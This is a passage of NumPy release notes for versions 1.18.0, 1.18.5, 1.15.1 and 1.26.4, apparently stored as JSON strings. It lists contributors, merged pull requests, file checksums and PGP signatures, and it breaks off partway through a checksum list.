numpy-1.18.0-cp38-cp38-manylinux1_i686.whl\n    4cac27e608e6d24a8b2b6b911bd23d6c  numpy-1.18.0-cp38-cp38-manylinux1_x86_64.whl\n    45a9355fb360d321d90ae55aefb1d206  numpy-1.18.0-cp38-cp38-win32.whl\n    c86dc59260f42e9cce05a396cbb33f4e  numpy-1.18.0-cp38-cp38-win_amd64.whl\n    2f607a0e79321b6e4f426307134dbd2c  numpy-1.18.0.tar.gz\n    3545a7dc22e704461f6ccb604b8da952  numpy-1.18.0.zip\n\nSHA256\n- ------\n\n    b091e5d4cbbe79f0e8b6b6b522346e54a282eadb06e3fd761e9b6fafc2ca91ad  numpy-1.18.0-cp35-cp35m-macosx_10_6_intel.whl\n    443ab93fc35b31f01db8704681eb2fd82f3a1b2fa08eed2dd0e71f1f57423d4a  numpy-1.18.0-cp35-cp35m-manylinux1_i686.whl\n    88c5ccbc4cadf39f32193a5ef22e3f84674418a9fd877c63322917ae8f295a56  numpy-1.18.0-cp35-cp35m-manylinux1_x86_64.whl\n    e1080e37c090534adb2dd7ae1c59ee883e5d8c3e63d2a4d43c20ee348d0459c5  numpy-1.18.0-cp35-cp35m-win32.whl\n    f084d513de729ff10cd72a1f80db468cff464fedb1ef2fea030221a0f62d7ff4  numpy-1.18.0-cp35-cp35m-win_amd64.whl\n    1baefd1fb4695e7f2e305467dbd876d765e6edd30c522894df76f8301efaee36  numpy-1.18.0-cp36-cp36m-macosx_10_9_x86_64.whl\n    cc070fc43a494e42732d6ae2f6621db040611c1dde64762a40c8418023af56d7  numpy-1.18.0-cp36-cp36m-manylinux1_i686.whl\n    6f8113c8dbfc192b58996ee77333696469ea121d1c44ea429d8fd266e4c6be51  numpy-1.18.0-cp36-cp36m-manylinux1_x86_64.whl\n    a30f5c3e1b1b5d16ec1f03f4df28e08b8a7529d8c920bbed657f4fde61f1fbcd  numpy-1.18.0-cp36-cp36m-win32.whl\n    3c68c827689ca0ca713dba598335073ce0966850ec0b30715527dce4ecd84055  numpy-1.18.0-cp36-cp36m-win_amd64.whl\n    f6a7421da632fc01e8a3ecd19c3f7350258d82501a646747664bae9c6a87c731  numpy-1.18.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    905cd6fa6ac14654a6a32b21fad34670e97881d832e24a3ca32e19b455edb4a8  numpy-1.18.0-cp37-cp37m-manylinux1_i686.whl\n    854f6ed4fa91fa6da5d764558804ba5b0f43a51e5fe9fc4fdc93270b052f188a  numpy-1.18.0-cp37-cp37m-manylinux1_x86_64.whl\n    ac3cf835c334fcc6b74dc4e630f9b5ff7b4c43f7fb2a7813208d95d4e10b5623  numpy-1.18.0-cp37-cp37m-win32.whl\n    62506e9e4d2a39c87984f081a2651d4282a1d706b1a82fe9d50a559bb58e705a  numpy-1.18.0-cp37-cp37m-win_amd64.whl\n    9d6de2ad782aae68f7ed0e0e616477fbf693d6d7cc5f0f1505833ff12f84a673  numpy-1.18.0-cp38-cp38-macosx_10_9_x86_64.whl\n    1c35fb1131362e6090d30286cfda52ddd42e69d3e2bf1fea190a0fad83ea3a18  numpy-1.18.0-cp38-cp38-manylinux1_i686.whl\n    56710a756c5009af9f35b91a22790701420406d9ac24cf6b652b0e22cfbbb7ff  numpy-1.18.0-cp38-cp38-manylinux1_x86_64.whl\n    03bbde29ac8fba860bb2c53a1525b3604a9b60417855ac3119d89868ec6041c3  numpy-1.18.0-cp38-cp38-win32.whl\n    712f0c32555132f4b641b918bdb1fd3c692909ae916a233ce7f50eac2de87e37  numpy-1.18.0-cp38-cp38-win_amd64.whl\n    e5eaf340489b76eef91352bf48b36e92ace07f6b0f1c87dcd3b5dbada97df03a  numpy-1.18.0.tar.gz\n    a9d72d9abaf65628f0f31bbb573b7d9304e43b1e6bbae43149c17737a42764c4  numpy-1.18.0.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl3/lBkACgkQZ58ig3fF\nJHvoCggAlvOOrdrPLXcMQAP+KTSX39jCTGgoq1MWOY3YC+5AqWnAa2LPoiL6pLjb\n5hLzdecQBJQ7e749TxgoW6jJd220zwwtFYAIdgkgHEPpfFCq97Hy0X8VkhferJ7+\nVI2oq3R0ArACyD9I4BfcXoZuqcmkh8/9Y1GqMfzpuU39WXggZbN47W1YC9XvJGs8\n32NHts2kVZyAIZxMGhBIm78Th35rnHg/2e1c5jfLS1eu7dWB5ilOvOHkNxNQp6ov\nNhUNW1/xz97EHxuLzz4YiptZT5KW3324LNp34zM9SH5J/cyCsrzNc9gB1biced6b\nUyKvmjoEeJB0hg1FYrpcE+Z1Dp2odg==\n=A0XS\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.18.5": "==========================\n\nThis is a short release to allow pickle ``protocol=5`` to be used in\nPython3.5. It is motivated by the recent backport of pickle5 to Python3.5.\n\nThe Python versions supported in this release are 3.5-3.8. Downstream\ndevelopers should use Cython >= 0.29.15 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid errors on the Skylake architecture.\n\nContributors\n============\n\nA total of 3 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matti Picus\n* Siyuan Zhuang +\n\nPull requests merged\n====================\n\nA total of 2 pull requests were merged for this release.\n\n* `16439 <https://github.com/numpy/numpy/pull/16439>`__: ENH: enable pickle protocol 5 support for python3.5\n* `16441 <https://github.com/numpy/numpy/pull/16441>`__: BUG: relpath fails for different drives on windows\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    f923519347ba9f6bca59dce0583bdbd5  numpy-1.18.5-cp35-cp35m-macosx_10_9_intel.whl\n    79990253bda9ffa2db75152e77c318e9  numpy-1.18.5-cp35-cp35m-manylinux1_i686.whl\n    d5bf77d6caf4f83ed871ab9e4f9d1f72  numpy-1.18.5-cp35-cp35m-manylinux1_x86_64.whl\n    2cc7cc1b1640d6b50c50d96a35624698  numpy-1.18.5-cp35-cp35m-win32.whl\n    5a93e72e30c56462492a29315e19c0cc  numpy-1.18.5-cp35-cp35m-win_amd64.whl\n    caef5b4785e5deb6891f118a49d48ccc  numpy-1.18.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    402be8c771c2541c7ee936ef63c9ebc0  numpy-1.18.5-cp36-cp36m-manylinux1_i686.whl\n    259dbb8694209921d56ffb091ae42b5b  numpy-1.18.5-cp36-cp36m-manylinux1_x86_64.whl\n    9188a301a9640836322f2dc926640515  numpy-1.18.5-cp36-cp36m-win32.whl\n    acfa82d4e66601386dad19ad3a3983a5  numpy-1.18.5-cp36-cp36m-win_amd64.whl\n    bc1ebaa1ecf20f22b72cbb824c9cbc21  numpy-1.18.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    97f27a6e2e6951cf8107132e7c628004  numpy-1.18.5-cp37-cp37m-manylinux1_i686.whl\n    f261237ab3d47b9b6e859bf240014a48  numpy-1.18.5-cp37-cp37m-manylinux1_x86_64.whl\n    08bdf2289600c5c728a2668b585fdd02  numpy-1.18.5-cp37-cp37m-win32.whl\n    8b793d97dae258d06e63c452a2684b16  numpy-1.18.5-cp37-cp37m-win_amd64.whl\n    2b9153362bf0e53574abc2df048a1578  numpy-1.18.5-cp38-cp38-macosx_10_9_x86_64.whl\n    1715c674b3070ccd90f56fa2cd48cce1  numpy-1.18.5-cp38-cp38-manylinux1_i686.whl\n    2347f759a1b8bc27423bb5ece6ae1c79  numpy-1.18.5-cp38-cp38-manylinux1_x86_64.whl\n    b66c03695208dd843b78acb32557a765  numpy-1.18.5-cp38-cp38-win32.whl\n    81c9e86442602529b3c52d4af7a515b7  numpy-1.18.5-cp38-cp38-win_amd64.whl\n    ca23173650ded5585f7030fee91005bf  numpy-1.18.5.tar.gz\n    0d426af04e17cd480ecf3cd70743eaf4  numpy-1.18.5.zip\n\nSHA256\n------\n::\n\n    e91d31b34fc7c2c8f756b4e902f901f856ae53a93399368d9a0dc7be17ed2ca0  numpy-1.18.5-cp35-cp35m-macosx_10_9_intel.whl\n    7d42ab8cedd175b5ebcb39b5208b25ba104842489ed59fbb29356f671ac93583  numpy-1.18.5-cp35-cp35m-manylinux1_i686.whl\n    a78e438db8ec26d5d9d0e584b27ef25c7afa5a182d1bf4d05e313d2d6d515271  numpy-1.18.5-cp35-cp35m-manylinux1_x86_64.whl\n    a87f59508c2b7ceb8631c20630118cc546f1f815e034193dc72390db038a5cb3  numpy-1.18.5-cp35-cp35m-win32.whl\n    965df25449305092b23d5145b9bdaeb0149b6e41a77a7d728b1644b3c99277c1  numpy-1.18.5-cp35-cp35m-win_amd64.whl\n    ac792b385d81151bae2a5a8adb2b88261ceb4976dbfaaad9ce3a200e036753dc  numpy-1.18.5-cp36-cp36m-macosx_10_9_x86_64.whl\n    ef627986941b5edd1ed74ba89ca43196ed197f1a206a3f18cc9faf2fb84fd675  numpy-1.18.5-cp36-cp36m-manylinux1_i686.whl\n    f718a7949d1c4f622ff548c572e0c03440b49b9531ff00e4ed5738b459f011e8  numpy-1.18.5-cp36-cp36m-manylinux1_x86_64.whl\n    4064f53d4cce69e9ac613256dc2162e56f20a4e2d2086b1956dd2fcf77b7fac5  numpy-1.18.5-cp36-cp36m-win32.whl\n    b03b2c0badeb606d1232e5f78852c102c0a7989d3a534b3129e7856a52f3d161  numpy-1.18.5-cp36-cp36m-win_amd64.whl\n    a7acefddf994af1aeba05bbbafe4ba983a187079f125146dc5859e6d817df824  numpy-1.18.5-cp37-cp37m-macosx_10_9_x86_64.whl\n    cd49930af1d1e49a812d987c2620ee63965b619257bd76eaaa95870ca08837cf  numpy-1.18.5-cp37-cp37m-manylinux1_i686.whl\n    b39321f1a74d1f9183bf1638a745b4fd6fe80efbb1f6b32b932a588b4bc7695f  numpy-1.18.5-cp37-cp37m-manylinux1_x86_64.whl\n    cae14a01a159b1ed91a324722d746523ec757357260c6804d11d6147a9e53e3f  numpy-1.18.5-cp37-cp37m-win32.whl\n    0172304e7d8d40e9e49553901903dc5f5a49a703363ed756796f5808a06fc233  numpy-1.18.5-cp37-cp37m-win_amd64.whl\n    e15b382603c58f24265c9c931c9a45eebf44fe2e6b4eaedbb0d025ab3255228b  numpy-1.18.5-cp38-cp38-macosx_10_9_x86_64.whl\n    3676abe3d621fc467c4c1469ee11e395c82b2d6b5463a9454e37fe9da07cd0d7  numpy-1.18.5-cp38-cp38-manylinux1_i686.whl\n    4674f7d27a6c1c52a4d1aa5f0881f1eff840d2206989bae6acb1c7668c02ebfb  numpy-1.18.5-cp38-cp38-manylinux1_x86_64.whl\n    9c9d6531bc1886454f44aa8f809268bc481295cf9740827254f53c30104f074a  numpy-1.18.5-cp38-cp38-win32.whl\n    3dd6823d3e04b5f223e3e265b4a1eae15f104f4366edd409e5a5e413a98f911f  numpy-1.18.5-cp38-cp38-win_amd64.whl\n    2c095bd1c5290966cceee8b6ef5cd66f13cd0e9d6d0e8d6fc8961abd64a8e51f  numpy-1.18.5.tar.gz\n    34e96e9dae65c4839bd80012023aadd6ee2ccb73ce7fdf3074c62f301e63120b  numpy-1.18.5.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.15.1": "==========================\n\nThis is a bugfix release for bugs and regressions reported following the 1.15.0\nrelease.\n\n* The annoying but harmless RuntimeWarning that \"numpy.dtype size changed\" has\n  been suppressed. The long standing suppression was lost in the transition to\n  pytest.\n* The update to Cython 0.28.3 exposed a problematic use of a gcc attribute used\n  to prefer code size over speed in module initialization, possibly resulting in\n  incorrect compiled code. This has been fixed in latest Cython but has been\n  disabled here for safety.\n* Support for big-endian and ARMv8 architectures has been improved.\n\nThe Python versions supported by this release are 2.7, 3.4-3.7. The wheels are\nlinked with OpenBLAS v0.3.0, which should fix some of the linalg problems\nreported for NumPy 1.14.\n\n\nCompatibility Note\n==================\n\nThe NumPy 1.15.x OS X wheels released on PyPI no longer contain 32-bit\nbinaries.  That will also be the case in future releases. See\n`11625 <https://github.com/numpy/numpy/issues/11625>`__ for the related\ndiscussion.  Those needing 32-bit support should look elsewhere or build\nfrom source.\n\n\nContributors\n============\n\nA total of 7 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Chris Billington\n* Elliott Sales de Andrade +\n* Eric Wieser\n* Jeremy Manning +\n* Matti Picus\n* Ralf Gommers\n\nPull requests merged\n====================\n\nA total of 24 pull requests were merged for this release.\n\n* `11647 <https://github.com/numpy/numpy/pull/11647>`__: MAINT: Filter Cython warnings in ``__init__.py``\n* `11648 <https://github.com/numpy/numpy/pull/11648>`__: BUG: Fix doc source links to unwrap decorators\n* `11657 <https://github.com/numpy/numpy/pull/11657>`__: BUG: Ensure singleton dimensions are not dropped when converting...\n* `11661 <https://github.com/numpy/numpy/pull/11661>`__: BUG: Warn on Nan in minimum,maximum for scalars\n* `11665 <https://github.com/numpy/numpy/pull/11665>`__: BUG: cython sometimes emits invalid gcc attribute\n* `11682 <https://github.com/numpy/numpy/pull/11682>`__: BUG: Fix regression in void_getitem\n* `11698 <https://github.com/numpy/numpy/pull/11698>`__: BUG: Make matrix_power again work for object arrays.\n* `11700 <https://github.com/numpy/numpy/pull/11700>`__: BUG: Add missing PyErr_NoMemory after failing malloc\n* `11719 <https://github.com/numpy/numpy/pull/11719>`__: BUG: Fix undefined functions on big-endian systems.\n* `11720 <https://github.com/numpy/numpy/pull/11720>`__: MAINT: Make einsum optimize default to False.\n* `11746 <https://github.com/numpy/numpy/pull/11746>`__: BUG: Fix regression in loadtxt for bz2 text files in Python 2.\n* `11757 <https://github.com/numpy/numpy/pull/11757>`__: BUG: Revert use of `console_scripts`.\n* `11758 <https://github.com/numpy/numpy/pull/11758>`__: BUG: Fix Fortran kind detection for aarch64 & s390x.\n* `11759 <https://github.com/numpy/numpy/pull/11759>`__: BUG: Fix printing of longdouble on ppc64le.\n* `11760 <https://github.com/numpy/numpy/pull/11760>`__: BUG: Fixes for unicode field names in Python 2\n* `11761 <https://github.com/numpy/numpy/pull/11761>`__: BUG: Increase required cython version on python 3.7\n* `11763 <https://github.com/numpy/numpy/pull/11763>`__: BUG: check return value of _buffer_format_string\n* `11775 <https://github.com/numpy/numpy/pull/11775>`__: MAINT: Make assert_array_compare more generic.\n* `11776 <https://github.com/numpy/numpy/pull/11776>`__: TST: Fix urlopen stubbing.\n* `11777 <https://github.com/numpy/numpy/pull/11777>`__: BUG: Fix regression in intersect1d.\n* `11779 <https://github.com/numpy/numpy/pull/11779>`__: BUG: Fix test sensitive to platform byte order.\n* `11781 <https://github.com/numpy/numpy/pull/11781>`__: BUG: Avoid signed overflow in histogram\n* `11785 <https://github.com/numpy/numpy/pull/11785>`__: BUG: Fix pickle and memoryview for datetime64, timedelta64 scalars\n* `11786 <https://github.com/numpy/numpy/pull/11786>`__: BUG: Deprecation triggers segfault\n\nChecksums\n=========\n\nMD5\n- ---\n\n    8e894e6873420259fa13bc685ca922a7  numpy-1.15.1-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    75154de03468c18c8b8d337b75d29bad  numpy-1.15.1-cp27-cp27m-manylinux1_i686.whl\n    50e3db64b9be2d399f7035ea71e16092  numpy-1.15.1-cp27-cp27m-manylinux1_x86_64.whl\n    35e15be82a5fc807572c7723171902b4  numpy-1.15.1-cp27-cp27mu-manylinux1_i686.whl\n    315cc1fb777c5251f27e49075b4d13fb  numpy-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl\n    7b6fbdca75eeb0a0c28c09bfaf2e17c2  numpy-1.15.1-cp27-none-win32.whl\n    8bc75bc94bd189a4cc3ded0f0e9b1353  numpy-1.15.1-cp27-none-win_amd64.whl\n    3c8950f10241185376ae6dd425209543  numpy-1.15.1-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    3e488ea8de86391335a56e7e2b2c47de  numpy-1.15.1-cp34-cp34m-manylinux1_i686.whl\n    0edee0d56ea5670b93b47410e66fa337  numpy-1.15.1-cp34-cp34m-manylinux1_x86_64.whl\n    67670224f931699c3836a1c9e4e8230b  numpy-1.15.1-cp34-none-win32.whl\n    5b9e984e562aac63b7549e456bd89dfe  numpy-1.15.1-cp34-none-win_amd64.whl\n    063f6a86f0713211b69050545e7c6c2c  numpy-1.15.1-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    4afe4fd3ea108a967bd0b9425305b979  numpy-1.15.1-cp35-cp35m-manylinux1_i686.whl\n    e1ebc2bc6d0947159b33f208e844251a  numpy-1.15.1-cp35-cp35m-manylinux1_x86_64.whl\n    910aab0be682f29a182239e4bd4631cf  numpy-1.15.1-cp35-none-win32.whl\n    bfaac6c5f4e8ab65cd76b010ea5c5dfe  numpy-1.15.1-cp35-none-win_amd64.whl\n    ce48f8b807c9ac8b7d00301584ab7976  numpy-1.15.1-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    d7d0c86acb89a86894811b8a792fba89  numpy-1.15.1-cp36-cp36m-manylinux1_i686.whl\n    3cd21facc099e72ab56a957978207c8c  numpy-1.15.1-cp36-cp36m-manylinux1_x86_64.whl\n    04471e530164dd25c7a9c1309712cc64  numpy-1.15.1-cp36-none-win32.whl\n    013ea5fbb8a953c2112acaa591c675a8  numpy-1.15.1-cp36-none-win_amd64.whl\n    3fdd39812b8fe172824d2cc52cb807c4  numpy-1.15.1-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    381bd5ea598b17333264b1cbc9f62fac  numpy-1.15.1-cp37-cp37m-manylinux1_i686.whl\n    e600bd09303c622ff4d16ed63fefb205  numpy-1.15.1-cp37-cp37m-manylinux1_x86_64.whl\n    c05625370ff437b3e1a4f08cf194e3e4  numpy-1.15.1-cp37-none-win32.whl\n    f476babe66c6104c00accbf0bcfafce5  numpy-1.15.1-cp37-none-win_amd64.whl\n    e369ffae42ab89c7d1be5fe786e27702  numpy-1.15.1.tar.gz\n    898004d5be091fde59ae353e3008fe9b  numpy-1.15.1.zip\n\nSHA256\n- ------\n\n    5e359e9c531075220785603e5966eef20ccae9b3b6b8a06fdfb66c084361ce92  numpy-1.15.1-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    419e6faee16097124ee627ed31572c7e80a1070efa25260b78097cca240e219a  numpy-1.15.1-cp27-cp27m-manylinux1_i686.whl\n    719b6789acb2bc86ea9b33a701d7c43dc2fc56d95107fd3c5b0a8230164d4dfb  numpy-1.15.1-cp27-cp27m-manylinux1_x86_64.whl\n    62d55e96ec7b117d3d5e618c15efcf769e70a6effaee5842857b64fb4883887a  numpy-1.15.1-cp27-cp27mu-manylinux1_i686.whl\n    df0b02c6705c5d1c25cc35c7b5d6b6f9b3b30833f9d178843397ae55ecc2eebb  numpy-1.15.1-cp27-cp27mu-manylinux1_x86_64.whl\n    dae8618c0bcbfcf6cf91350f8abcdd84158323711566a8c5892b5c7f832af76f  numpy-1.15.1-cp27-none-win32.whl\n    a3bd01d6d3ed3d7c06d7f9979ba5d68281f15383fafd53b81aa44b9191047cf8  numpy-1.15.1-cp27-none-win_amd64.whl\n    1c362ad12dd09a43b348bb28dd2295dd9cdf77f41f0f45965e04ba97f525b864  numpy-1.15.1-cp34-cp34m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    83b8fc18261b70f45bece2d392537c93dc81eb6c539a16c9ac994c47fc79f09a  numpy-1.15.1-cp34-cp34m-manylinux1_i686.whl\n    ce75ed495a746e3e78cfa22a77096b3bff2eda995616cb7a542047f233091268  numpy-1.15.1-cp34-cp34m-manylinux1_x86_64.whl\n    340ec1697d9bb3a9c464028af7a54245298502e91178bddb4c37626d36e197b7  numpy-1.15.1-cp34-none-win32.whl\n    2156a06bd407918df4ac0122df6497a9c137432118f585e5b17d543e593d1587  numpy-1.15.1-cp34-none-win_amd64.whl\n    549f3e9778b148a47f4fb4682955ed88057eb627c9fe5467f33507c536deda9d  numpy-1.15.1-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    378378973546ecc1dfaf9e24c160d683dd04df871ecd2dcc86ce658ca20f92c0  numpy-1.15.1-cp35-cp35m-manylinux1_i686.whl\n    35db8d419345caa4eeaa65cd63f34a15208acd87530a30f0bc25fc84f55c8c80  numpy-1.15.1-cp35-cp35m-manylinux1_x86_64.whl\n    4287104c24e6a09b9b418761a1e7b1bbde65105f110690ca46a23600a3c606b8  numpy-1.15.1-cp35-none-win32.whl\n    7a70f2b60d48828cba94a54a8776b61a9c2657a803d47f5785f8062e3a9c7c55  numpy-1.15.1-cp35-none-win_amd64.whl\n    e3660744cda0d94b90141cdd0db9308b958a372cfeee8d7188fdf5ad9108ea82  numpy-1.15.1-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    5ee7f3dbbdba0da75dec7e94bd7a2b10fe57a83e1b38e678200a6ad8e7b14fdc  numpy-1.15.1-cp36-cp36m-manylinux1_i686.whl\n    36e8dcd1813ca92ce7e4299120cee6c03adad33d89b54862c1b1a100443ac399  numpy-1.15.1-cp36-cp36m-manylinux1_x86_64.whl\n    9473ad28375710ab18378e72b59422399b27e957e9339c413bf00793b4b12df0  numpy-1.15.1-cp36-none-win32.whl\n    c81a6afc1d2531a9ada50b58f8c36197f8418ef3d0611d4c1d7af93fdcda764f  numpy-1.15.1-cp36-none-win_amd64.whl\n    98b86c62c08c2e5dc98a9c856d4a95329d11b1c6058cb9b5191d5ea6891acd09  numpy-1.15.1-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    24e4149c38489b51fc774b1e1faa9103e82f73344d7a00ba66f6845ab4769f3f  numpy-1.15.1-cp37-cp37m-manylinux1_i686.whl\n    95b085b253080e5d09f7826f5e27dce067bae813a132023a77b739614a29de6e  numpy-1.15.1-cp37-cp37m-manylinux1_x86_64.whl\n    361370e9b7f5e44c41eee29f2bb5cb3b755abb4b038bce6d6cbe08db7ff9cb74  numpy-1.15.1-cp37-none-win32.whl\n    f2362d0ca3e16c37782c1054d7972b8ad2729169567e3f0f4e5dd3cdf85f188e  numpy-1.15.1-cp37-none-win_amd64.whl\n    3c1ccce5d935ef8df16ae0595b459ef08a5cdb05aee195ebc04b9d89a72be7fa  numpy-1.15.1.tar.gz\n    7b9e37f194f8bcdca8e9e6af92e2cbad79e360542effc2dd6b98d63955d8d8a3  numpy-1.15.1.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbfHKnAAoJEGefIoN3xSR7M78IAIGQXVms9Ior93xO+EtJK5zP\nHKmgfhJmSPNcL9pX8Jk+rxCMHogR6GBhynXpWnFE/oqzsd4HOhwK6MAVVM9IOJEH\npuFFbqN6W2UM6Ka2VJP5FAI6w7Fb8b6xeFgn/sqf26wBasNSUXV0KYEun5MvsHJg\nAxK3uFzI5WoWinyOyk5m+7u5aLA4VSQcGMfzQufAZD01/FJqwk5qeQWF9+7UL6U3\nYEmnb71RVejeC2LqKN8fKskTX6maFahGLVABysmyA8iZjxzGmTM6CgE29XV4fzW6\n7IosPYPJIPbN79EosPlj0tR7aoL3Y4a8kqnAJF2U3H7bp1YVPV5nl2KxTh/zKig=\n=PaAm\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.26.4": "==========================\n\nNumPy 1.26.4 is a maintenance release that fixes bugs and regressions\ndiscovered after the 1.26.3 release. The Python versions supported by this\nrelease are 3.9-3.12. This is the last planned release in the 1.26.x series.\n\n\nContributors\n============\n\nA total of 13 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Elliott Sales de Andrade\n* Lucas Colley +\n* Mark Ryan +\n* Matti Picus\n* Nathan Goldbaum\n* Ola x Nilsson +\n* Pieter Eendebak\n* Ralf Gommers\n* Sayed Adel\n* Sebastian Berg\n* Stefan van der Walt\n* Stefano Rivera\n\n\nPull requests merged\n====================\n\nA total of 19 pull requests were merged for this release.\n\n* `25323 <https://github.com/numpy/numpy/pull/25323>`__: BUG: Restore missing asstr import\n* `25523 <https://github.com/numpy/numpy/pull/25523>`__: MAINT: prepare 1.26.x for further development\n* `25539 <https://github.com/numpy/numpy/pull/25539>`__: BUG: ``numpy.array_api``: fix ``linalg.cholesky`` upper decomp...\n* `25584 <https://github.com/numpy/numpy/pull/25584>`__: CI: Bump azure pipeline timeout to 120 minutes\n* `25585 <https://github.com/numpy/numpy/pull/25585>`__: MAINT, BLD: Fix unused inline functions warnings on clang\n* `25599 <https://github.com/numpy/numpy/pull/25599>`__: BLD: include fix for MinGW platform detection\n* `25618 <https://github.com/numpy/numpy/pull/25618>`__: TST: Fix test_numeric on riscv64\n* `25619 <https://github.com/numpy/numpy/pull/25619>`__: BLD: fix building for windows ARM64\n* `25620 <https://github.com/numpy/numpy/pull/25620>`__: MAINT: add ``newaxis`` to ``__all__`` in ``numpy.array_api``\n* `25630 <https://github.com/numpy/numpy/pull/25630>`__: BUG: Use large file fallocate on 32 bit linux platforms\n* `25643 <https://github.com/numpy/numpy/pull/25643>`__: TST: Fix test_warning_calls on Python 3.12\n* `25645 <https://github.com/numpy/numpy/pull/25645>`__: TST: Bump pytz to 2023.3.post1\n* `25658 <https://github.com/numpy/numpy/pull/25658>`__: BUG: Fix AVX512 build flags on Intel Classic Compiler\n* `25670 <https://github.com/numpy/numpy/pull/25670>`__: BLD: fix potential issue with escape sequences in ``__config__.py``\n* `25718 <https://github.com/numpy/numpy/pull/25718>`__: CI: pin cygwin python to 3.9.16-1 and fix typing tests [skip...\n* `25720 <https://github.com/numpy/numpy/pull/25720>`__: MAINT: Bump cibuildwheel to v2.16.4\n* `25748 <https://github.com/numpy/numpy/pull/25748>`__: BLD: unvendor meson-python on 1.26.x and upgrade to meson-python...\n* `25755 <https://github.com/numpy/numpy/pull/25755>`__: MAINT: Include header defining backtrace\n* `25756 <https://github.com/numpy/numpy/pull/25756>`__: BUG: Fix np.quantile([Fraction(2,1)], 0.5) (#24711)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    90f33cdd8934cd07192d6ede114d8d4d  numpy-1.26.4-cp310-cp310-macosx_10_9_x86_64.whl\n    63ac60767f6724490e587f6010bd6839  numpy-1.26.4-cp310-cp310-macosx_11_0_arm64.whl\n    ad4e82b225aaaf5898ea9798b50978d8  numpy-1.26.4-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    d428e3da2df4fa359313348302cf003a  numpy-1.26.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    89937c3bb596193f8ca9eae2ff84181e  numpy-1.26.4-cp310-cp310-musllinux_1_1_aarch64.whl\n    de4f9da0a4e6dfd4cec39c7ad5139803  numpy-1.26.4-cp310-cp310-musllinux_1_1_x86_64.whl\n    2c1f73fd9b3acf4b9b0c23e985cdd38f  numpy-1.26.4-cp310-cp310-win32.whl\n    920ad1f50e478b1a877fe7b7a46cc520  numpy-1.26.4-cp310-cp310-win_amd64.whl\n    719d1ff12db38903dcfd6749078fb11d  numpy-1.26.4-cp311-cp311-macosx_10_9_x86_64.whl\n    eb601e80194d2e1c00d8daedd8dc68c4  numpy-1.26.4-cp311-cp311-macosx_11_0_arm64.whl\n    71a7ab11996fa370dc28e28731bd5c32  numpy-1.26.4-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    eb0cdd03e1ee2eb45c57c7340c98cf48  numpy-1.26.4-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9d4ae1b0b27a625400f81ed1846a5667  numpy-1.26.4-cp311-cp311-musllinux_1_1_aarch64.whl\n    1b6771350d2f496157430437a895ba4b  numpy-1.26.4-cp311-cp311-musllinux_1_1_x86_64.whl\n    1e4a18612ee4d0e54e0833574ebc6d25  numpy-1.26.4-cp311-cp311-win32.whl\n    5fd325dd8704023c1110835d7a1b095a  numpy-1.26.4-cp311-cp311-win_amd64.whl\n    d95ce582923d24dbddbc108aa5fd2128  numpy-1.26.4-cp312-cp312-macosx_10_9_x86_64.whl\n    6f16f3d70e0d95ce2b032167c546cc95  numpy-1.26.4-cp312-cp312-macosx_11_0_arm64.whl\n    5369536d4c45fbe384147ff23185b48a  numpy-1.26.4-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1ceb224096686831ad731e472b65e96a  numpy-1.26.4-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cd8d3c00bbc89f9bc07e2df762f9e2ae  numpy-1.26.4-cp312-cp312-musllinux_1_1_aarch64.whl\n    5bd81ce840bb2e42befe01efb0402b79  numpy-1.26.4-cp312-cp312-musllinux_1_1_x86_64.whl\n    2cc3b0757228078395da3efa3dc99f23  numpy-1.26.4-cp312-cp312-win32.whl\n    305155bd5ae879344c58968879584ed1  numpy-1.26.4-cp312-cp312-win_amd64.whl\n    ec2310f67215743e9c5d16b6c9fb87b6  numpy-1.26.4-cp39-cp39-macosx_10_9_x86_64.whl\n    